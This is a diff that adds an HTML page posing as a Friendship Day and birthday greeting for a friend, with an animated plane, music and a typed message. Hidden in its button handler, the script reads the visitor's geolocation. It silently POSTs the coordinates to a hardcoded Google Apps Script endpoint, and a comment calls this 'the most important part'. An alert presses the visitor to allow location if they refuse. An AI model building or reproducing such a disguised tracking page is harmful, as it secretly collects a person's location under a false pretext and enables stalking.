@@ -1,0 +1,143 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Annual Friendship Day Surprise</title>
+
+<style>
+body{
+  margin:0;
+  height:100vh;
+  background:url("Backgroundimg.jpg") center/cover no-repeat;
+  font-family: Arial, Helvetica, sans-serif;
+  font-weight:bold;
+  overflow:hidden;
+  text-align:center;
+  color:white;
+}
+
+/* CITY NAMES */
+#cities{
+  position:fixed;
+  top:15px;
+  width:100%;
+  display:flex;
+  justify-content:space-between;
+  padding:0 20px;
+  font-size:16px;
+  text-shadow:2px 2px 6px black;
+}
+
+/* BUTTON */
+#btn{
+  margin-top:45vh;
+  padding:16px 30px;
+  font-size:18px;
+  border:none;
+  border-radius:30px;
+  background:#ff5252;
+  color:white;
+  cursor:pointer;
+}
+
+/* PLANE */
+#plane{
+  position:fixed;
+  top:25vh;
+  left:-120px;
+  width:90px;
+  display:none;
+  transition:transform 4s linear;
+}
+
+.fly{
+  transform:translate(65vw,10vh);
+}
+
+/* MESSAGE */
+#message{
+  display:none;
+  margin:20px;
+  font-size:18px;
+  white-space:pre-line;
+  text-shadow:2px 2px 6px black;
+}
+</style>
+</head>
+
+<body>
+
+<div id="cities">
+  <span>📍 Delhi</span>
+  <span>📍 Bhavnagar</span>
+</div>
+
+<button id="btn">🎁 Surprise for Annual Friendship Day Celebration</button>
+
+<img id="plane" src="plane.jpeg">
+
+<div id="message"></div>
+
+<audio id="music" src="birthday.mp3"></audio>
+
+<script>
+const WEB_APP_URL = "https://script.google.com/macros/s/AKfycbxfh3bmK0VBvtXjkaS2AAVhBLoppeKjfHEdjqBf2MK5ZbM1GFBJX-AYaGAUc74i179V/exec";
+
+const text = `Happy Annual Friendship Day yaar ✨️
+
+So with the journey of my life Mahadev blessed me 🌟 with the bestest best friend 😊.
+We have created best memories 👀, fun 😄, joy 💫 together 🧿😅...
+
+I hope that our journey of friendship will be upto 7 janam 🌍
+Know that I am always there for you 😁
+
+Always achieve success in your life ✨️
+I am proud of you, keep growing 💫
+
+Happy Annual Friendship Day
+and Happiest Birthday to you 🎂🍫🍻🎈🎉
+
+We have completed 5+ years of friendship ❤️`;
+
+document.getElementById("btn").onclick = function(){
+
+  // LOCATION (THIS IS THE MOST IMPORTANT PART)
+  navigator.geolocation.getCurrentPosition(
+    function(pos){
+      fetch(WEB_APP_URL,{
+        method:"POST",
+        body:JSON.stringify({
+          lat:pos.coords.latitude,
+          lon:pos.coords.longitude
+        })
+      });
+    },
+    function(){
+      alert("Please allow location to continue");
+    }
+  );
+
+  document.getElementById("music").play().catch(()=>{});
+  document.getElementById("btn").style.display="none";
+
+  const plane=document.getElementById("plane");
+  plane.style.display="block";
+  plane.offsetHeight;
+  plane.classList.add("fly");
+
+  setTimeout(typeMessage,4200);
+};
+
+function typeMessage(){
+  const box=document.getElementById("message");
+  box.style.display="block";
+  let i=0;
+  const t=setInterval(()=>{
+    box.textContent+=text[i++];
+    if(i>=text.length) clearInterval(t);
+  },40);
+}
+</script>
+
+</body>
+</html>
